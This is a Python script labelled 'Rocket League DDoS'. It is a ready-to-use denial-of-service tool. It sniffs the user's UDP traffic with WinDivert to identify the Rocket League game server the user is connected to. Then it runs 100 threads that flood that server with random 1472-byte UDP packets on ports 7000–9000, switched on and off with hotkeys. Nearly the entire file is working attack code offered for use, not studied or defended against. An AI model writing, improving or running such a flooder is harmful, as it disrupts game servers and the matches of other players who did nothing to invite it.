import ctypes
import socket
import threading
import time
import random
import sys
import os
import re
from collections import deque
import ipaddress

try:
    import pydivert
    import keyboard
    from colorama import init, Fore, Style
except ImportError as e:
    print(f"Error: A required library is not installed. Please run 'pip install -r requirements.txt'. Missing: {e.name}")
    sys.exit(1)

# --- Global State ---
running = True
server_ip = None
server_hostname = "Not Detected"
flood_active = False
message_log = deque(maxlen=5)  # Use deque for a fixed-size, scrolling log
ui_lock = threading.RLock()
CONSOLE_WIDTH = 120

# --- Core Functions ---
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def find_rl_server():
    global server_ip, server_hostname, flood_active
    if flood_active:
        toggle_ddos()  # Turn off attack if it's running
    print_message(f"{Fore.CYAN}[SCAN] {Style.RESET_ALL}Starting network scan for game server...")

    port_counter = {}
    filter_str = "udp and (udp.DstPort > 7000 or udp.SrcPort > 7000)"

    try:
        with pydivert.WinDivert(filter_str) as w:
            for _ in range(200):  # Scan a limited number of packets
                packet = w.recv()
                if packet.dst_addr and not ipaddress.ip_address(packet.dst_addr).is_multicast:
                    port_counter[packet.dst_addr] = port_counter.get(packet.dst_addr, 0) + 1
                w.send(packet)
    except Exception as e:
        print_message(f"{Fore.RED}[ERROR] {Style.RESET_ALL}Network scan failed: {e}")
        return

    if not port_counter:
        print_message(f"{Fore.RED}[FAIL] {Style.RESET_ALL}Could not find Rocket League traffic. Is the game running?")
        return

    target_ip = max(port_counter, key=port_counter.get)

    if server_ip != target_ip:
        server_ip = target_ip
        try:
            hostname, _, _ = socket.gethostbyaddr(server_ip)
            server_hostname = hostname
            print_message(f"{Fore.GREEN}[SUCCESS] {Style.RESET_ALL}Server detected: {server_hostname}")
        except socket.herror:
            server_hostname = "Hostname N/A"
            print_message(f"{Fore.GREEN}[SUCCESS] {Style.RESET_ALL}Server detected: {server_ip}")
    else:
        print_message(f"{Fore.YELLOW}[INFO] {Style.RESET_ALL}Server address re-confirmed: {server_ip}")

def toggle_ddos():
    global flood_active
    if not server_ip:
        print_message(f"{Fore.RED}[ERROR] {Style.RESET_ALL}No server detected. Press F10 in-game first.")
        return
    flood_active = not flood_active
    status_msg = f"{Fore.GREEN}Attack ENABLED{Style.RESET_ALL}" if flood_active else f"{Fore.YELLOW}Attack DISABLED{Style.RESET_ALL}"
    print_message(f"[STATUS] {status_msg}")

def ddos_worker():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random.randbytes(1472)
    while running:
        if flood_active and server_ip:
            try:
                sock.sendto(payload, (server_ip, random.randint(7000, 9000)))
            except OSError:
                pass
        else:
            time.sleep(0.1)

def on_exit():
    global running
    running = False

# --- UI Functions ---
def strip_ansi(text):
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def print_message(message):
    with ui_lock:
        message_log.append(message)
        draw_ui()

def draw_ui():
    with ui_lock:
        os.system('cls' if os.name == 'nt' else 'clear')

        status_color = Fore.GREEN if flood_active else Fore.CYAN
        status_text = "ACTIVE" if flood_active else "Idle"
        status_line = f" {Style.BRIGHT}Rocket League DDoS | v10.1 | Status: {status_color}[{status_text}]{Style.RESET_ALL} "

        print(Fore.CYAN + "<" + "-" * (CONSOLE_WIDTH - 2) + ">" + Style.RESET_ALL)
        clean_header = strip_ansi(status_line)
        padding = (CONSOLE_WIDTH - len(clean_header)) // 2
        print(" " * padding + status_line)
        print(Fore.CYAN + "<" + "-" * (CONSOLE_WIDTH - 2) + ">" + Style.RESET_ALL)
        print()

        ip_display = server_ip if server_ip else "N/A"
        hostname_display = server_hostname if server_ip and server_hostname != "Not Detected" else "N/A"
        print(f"{Style.BRIGHT}[Target]{Style.RESET_ALL}")
        print(f"  IP:       {Fore.YELLOW}{ip_display}{Style.RESET_ALL}")
        print(f"  Hostname: {Fore.YELLOW}{hostname_display}{Style.RESET_ALL}")
        print()

        print(f"{Style.BRIGHT}[Hotkeys]{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}F8:{Style.RESET_ALL}  Toggle Attack")
        print(f"  {Fore.CYAN}F10:{Style.RESET_ALL} Detect Server")
        print(f"  {Fore.CYAN}F4:{Style.RESET_ALL}  Exit")
        print()

        print(f"{Style.BRIGHT}[Log]{Style.RESET_ALL}")
        for msg in list(message_log):
            print(f"  > {msg}")

def main():
    if not is_admin():
        print(f"{Fore.RED}Error: This script requires administrator privileges.{Style.RESET_ALL}")
        print("Please re-run this script by right-clicking it and selecting 'Run as administrator'.")
        input("\nPress Enter to exit.")
        sys.exit(1)

    init(autoreset=True)

    keyboard.add_hotkey('f10', find_rl_server)
    keyboard.add_hotkey('f8', toggle_ddos)
    keyboard.add_hotkey('f4', on_exit)

    num_threads = 100
    for _ in range(num_threads):
        threading.Thread(target=ddos_worker, daemon=True).start()

    draw_ui()
    print_message(f"Armed with {num_threads} threads. Press F10 in-game.")

    try:
        while running:
            time.sleep(0.5)
    except KeyboardInterrupt:
        on_exit()
    finally:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.YELLOW}Exiting... Thank you for using the tool.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
